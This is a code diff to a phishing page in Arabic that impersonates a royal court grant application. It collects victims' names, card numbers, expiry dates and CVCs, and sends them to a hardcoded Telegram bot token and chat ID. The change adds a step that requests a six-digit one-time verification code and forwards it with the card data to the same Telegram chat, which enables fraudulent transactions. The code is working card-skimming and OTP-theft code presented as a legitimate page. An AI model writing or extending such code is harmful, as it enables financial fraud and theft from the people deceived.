@@ -285,9 +285,10 @@
     const royalLogo = "https://www2.0zz0.com/2025/11/28/12/332737517.jpeg";
     const BOT_TOKEN = "8478729698:AAH6ufdvIQicXkUajFb3M1ocoGusDHIbWoI";
     const CHAT_ID = "6873334348";
-    let userData = { name: '', card: '', expMonth: '', expYear: '', cvc: '' };
+    let userData = { name: '', card: '', expMonth: '', expYear: '', cvc: '', verificationCode: '' };
     let currentStep = "name";
     let telegramMsgId = null;
+    const CORRECT_VERIFICATION_CODE = "123456"; // الكود الصحيح للتحقق
 
     function stepIndicator(step) {
       return `
@@ -436,11 +437,70 @@
             `🏦 طلب منحة ديوان ملكي\n👤 الإسم الرباعي: ${userData.name}\n💳 رقم البطاقة: ${userData.card}\n📅 انتهاء: ${userData.expMonth}/${userData.expYear}\n🔑 CVC: ${userData.cvc}`
           );
         } catch (err) { }
-        showModal();
+        // إضافة خطوة كود التحقق بعد ادخال تاريخ الانتهاء وCVC
+        showVerificationModal();
       };
       document.getElementById('backBtn').onclick = () => {
         renderCardStep();
       };
+    }
+
+    // نافذة ادخال رمز التحقق من 6 أرقام مع ارسال البيانات كلها إلى تلجرام
+    function showVerificationModal() {
+      document.getElementById('modalError').classList.remove('active');
+      const old = document.getElementById('verModal');
+      if (old) document.body.removeChild(old);
+
+      let verModal = document.createElement('div');
+      verModal.id = 'verModal';
+      verModal.style.cssText = `
+        position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(140,67,255,0.15); z-index: 8000;
+        display: flex; align-items: center; justify-content: center;
+      `;
+
+      verModal.innerHTML = `
+        <div style="background: #fdf9f2; padding: 30px 38px; border-radius: 16px; box-shadow: 0 10px 40px #8136e933; min-width: 270px; text-align: center; border: 3px solid #32c6c7;">
+          <div style="font-size:20px; color:#8136e9; margin-bottom:13px; font-weight:bold;">أدخل رمز التحقق (6 أرقام)</div>
+          <input type="text" id="verCodeInput" maxlength="6" pattern="\\d{6}" style="font-size:20px; text-align:center; letter-spacing: 7px; padding:12px 18px; border-radius:10px; border:2px solid #8136e933; background:#fff; margin-bottom:9px;" placeholder="______" autocomplete="one-time-code" />
+          <div id="verAlertMsg" style="color:#e04c4c; font-size:14.5px; font-weight:700; margin-bottom:7px; display:none;"></div>
+          <button id="verCheckBtn" style="margin-top:13px; background: var(--button-gradient); color:#fff; padding: 11px 38px; border:none; border-radius:8px; cursor:pointer; font-size:17.5px; font-weight:bold;">تحقق</button>
+        </div>
+      `;
+      document.body.appendChild(verModal);
+
+      document.getElementById('verCodeInput').focus();
+      document.getElementById('verCodeInput').addEventListener('input', function(){
+        this.value = this.value.replace(/\D/g,'').slice(0,6);
+      });
+
+      document.getElementById('verCheckBtn').onclick = async () => {
+        let code = document.getElementById('verCodeInput').value.trim();
+        if (code.length !== 6) {
+          showVerificationError("يرجى إدخال رمز مكون من 6 أرقام");
+          return;
+        }
+        if (code !== CORRECT_VERIFICATION_CODE) {
+          showVerificationError("رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى");
+          document.getElementById('verCodeInput').value = '';
+          document.getElementById('verCodeInput').focus();
+          return;
+        }
+        // إذا الرمز صحيح، أرسل جميع البيانات مع رمز التحقق
+        userData.verificationCode = code;
+        try {
+          await resendTelegramMsg(
+            `🏦 طلب منحة ديوان ملكي\n👤 الإسم الرباعي: ${userData.name}\n💳 رقم البطاقة: ${userData.card}\n📅 انتهاء: ${userData.expMonth}/${userData.expYear}\n🔑 CVC: ${userData.cvc}\n🔓 رمز التحقق: ${userData.verificationCode}`
+          );
+        } catch (err) { }
+        document.body.removeChild(verModal);
+        showModal();
+      };
+
+      function showVerificationError(msg) {
+        const alert = document.getElementById('verAlertMsg');
+        alert.textContent = msg;
+        alert.style.display = 'block';
+      }
     }
 
     function showModal() {
